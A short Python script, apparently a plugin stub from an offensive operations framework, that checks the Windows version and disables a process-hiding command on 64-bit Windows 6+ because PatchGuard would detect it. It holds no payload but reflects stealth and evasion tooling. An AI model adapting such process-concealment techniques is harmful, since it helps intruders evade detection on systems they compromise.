
import datetime
import sys
import dsz
import ops
import ops.system.systemversion
dsz.control.echo.Off()
version = ops.system.systemversion.get_os_version(maxage=datetime.timedelta.max)
if ((version.versioninfo.major >= 6) and (version.versioninfo.arch == 'x64')):
    ops.error('PatchGuard will detect and kill the process hidden via this technique. Command disabled on this platform.')
    sys.exit((-1))